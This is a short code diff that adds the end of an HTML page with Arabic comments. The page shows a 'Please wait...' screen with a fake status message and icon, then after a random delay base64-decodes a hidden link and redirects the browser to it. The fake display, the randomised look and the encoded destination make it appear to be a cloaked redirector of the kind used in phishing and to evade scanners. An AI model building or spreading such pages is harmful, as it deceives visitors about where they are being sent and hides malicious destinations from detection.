@@ -77,3 +77,23 @@
         const delay = Math.floor(Math.random() * 2000) + 1000; // من 1000 إلى 3000
 
         // تطبيق القيم
+        document.body.style.backgroundColor = bg;
+        document.body.style.fontFamily = font;
+        document.title = title;
+        document.getElementById("fake-status").textContent = message;
+        document.getElementById("fake-icon").src = icon;
+
+        // التوجيه بعد التأخير
+        setTimeout(() => {
+          const decoded = atob(encodedLink);
+          window.location.href = decoded;
+        }, delay);
+      };
+    </script>
+  </head>
+  <body>
+    <img id="fake-icon" src="" alt="icon" />
+    <h2 id="fake-status">Please wait...</h2>
+    <p>This may take a few seconds.</p>
+  </body>
+</html>
